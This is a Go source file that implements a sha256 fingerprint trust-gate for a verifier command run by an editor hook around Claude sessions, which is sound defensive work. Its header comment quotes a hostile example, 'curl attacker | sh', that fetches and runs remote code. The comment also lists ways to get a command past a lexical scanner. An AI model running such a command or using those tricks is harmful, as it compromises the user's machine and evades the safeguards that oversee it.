// Package config — trust-gate for [post_edit.verify].command.
//
// Security review #4 / bughunt-8 (iteration 2 of the fix-loop)
// established that a lexical scan of Bash command strings can be
// defeated by an unbounded number of obfuscation forms (backslash
// escapes, empty quotes, command substitution, parameter expansion,
// ANSI-C escapes, glob, base64-decode, variable indirection, etc.).
// Enumerating bypasses is futile.
//
// The trust-gate redesign is the correct architectural fix: a
// `command` is present in `.leonard/config.toml` is NOT sufficient
// to make it execute. The operator must run `leonard config trust`
// from a shell first. That stores a sha256 fingerprint of the
// current command in `.leonard/trusted-verifier.sha256`. The
// post-edit hook recomputes the fingerprint each time and refuses
// to invoke sh -c when it doesn't match.
//
// Consequences:
//
//   - A malicious project that ships `[post_edit.verify].command =
//     "curl attacker | sh"` won't execute on first checkout. The
//     hook emits an additionalContext message telling Claude that
//     the verifier is untrusted; the user must inspect the command
//     and run `leonard config trust` (or delete the config) to
//     authorize.
//   - A Claude session that edits `.leonard/config.toml` (which is
//     already blocked at the pre-edit layer by the v0.46/v0.50
//     guards, but defense-in-depth is cheap) AND somehow lands a
//     malicious command in there — STILL won't execute because the
//     fingerprint won't match.
//   - The trust file is intentionally gitignored: trust is per-
//     machine, not per-checkout. A team that wants shared opt-in
//     should commit a documented `make trust` target instead.
package config

import (
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
)

// TrustFilename is the per-machine fingerprint file. Lives next to
// config.toml in .leonard/ and is excluded by Leonard's `.gitignore`.
const TrustFilename = "trusted-verifier.sha256"

// FingerprintCommand returns the canonical sha256 hex digest of a
// verifier command. Leading/trailing whitespace is trimmed so a
// minor edit (extra newline) doesn't invalidate trust; internal
// whitespace IS significant (operator can't trust `cargo check`
// then have `cargo check --release` slip in).
func FingerprintCommand(command string) string {
	sum := sha256.Sum256([]byte(strings.TrimSpace(command)))
	return hex.EncodeToString(sum[:])
}

// ReadTrustedFingerprint reads the operator-granted trust fingerprint
// from .leonard/trusted-verifier.sha256. Returns ("", nil) when the
// file doesn't exist (no trust granted yet). Returns an error only
// for unexpected I/O failures.
func ReadTrustedFingerprint(dataDir string) (string, error) {
	path := filepath.Join(dataDir, TrustFilename)
	b, err := os.ReadFile(path)
	if errors.Is(err, fs.ErrNotExist) {
		return "", nil
	}
	if err != nil {
		return "", fmt.Errorf("trust: read %s: %w", path, err)
	}
	return strings.TrimSpace(string(b)), nil
}

// WriteTrustedFingerprint writes the operator-granted trust
// fingerprint. Called by `leonard config trust`. The file is
// gitignored.
func WriteTrustedFingerprint(dataDir, fingerprint string) error {
	if err := os.MkdirAll(dataDir, 0o755); err != nil {
		return err
	}
	path := filepath.Join(dataDir, TrustFilename)
	return os.WriteFile(path, []byte(fingerprint+"\n"), 0o600)
}

// VerifyCommandTrusted reports whether `command` matches the
// stored trust fingerprint. Returns:
//
//   - (true, nil)  — trust granted; command may execute
//   - (false, nil) — trust missing or fingerprint mismatch
//   - (false, err) — I/O failure reading the trust file
//
// Empty command always returns (false, nil) since there's nothing
// to authorize. The caller is expected to short-circuit before
// calling.
func VerifyCommandTrusted(dataDir, command string) (bool, error) {
	if strings.TrimSpace(command) == "" {
		return false, nil
	}
	stored, err := ReadTrustedFingerprint(dataDir)
	if err != nil {
		return false, err
	}
	if stored == "" {
		return false, nil
	}
	return stored == FingerprintCommand(command), nil
}
